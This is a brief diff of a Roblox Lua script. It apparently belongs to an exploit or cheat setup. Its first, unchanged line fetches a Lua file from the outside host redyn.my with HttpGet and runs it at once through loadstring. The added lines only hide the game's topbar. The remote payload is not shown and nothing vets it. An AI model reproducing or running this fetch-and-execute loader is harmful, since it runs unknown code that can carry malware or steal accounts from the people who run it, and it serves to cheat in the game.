@@ -1,1 +1,8 @@
 loadstring(game:HttpGet("http://redyn.my/Red/Loader/7ce11c6ead.lua"))()
+local StarterGui = game:GetService("StarterGui")
+
+-- Wait a moment so CoreGui is loaded
+task.wait(1)
+
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Topbar, false)
+
